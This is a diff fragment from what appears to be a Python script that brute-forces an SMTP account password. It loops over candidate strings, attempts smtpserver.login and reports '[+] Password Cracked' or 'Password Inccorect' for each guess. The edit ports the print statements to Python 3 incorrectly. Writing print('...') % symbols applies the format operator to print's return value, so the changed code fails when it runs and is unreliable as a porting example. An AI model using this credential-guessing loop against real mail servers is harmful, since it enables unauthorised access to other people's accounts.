@@ -17,10 +17,10 @@ for symbols in print_perms:
     try:
         smtpserver.login(user, password)
 
-        print "[+] Password Cracked: %s" % symbols
+        print("[+] Password Cracked: %s") % symbols
         break
     except smtplib.SMTPAuthenticationError:
-        print "[!] Password Inccorect: %s" % symbols
+        print("[!] Password Inccorect: %s") % symbols
 
 
 
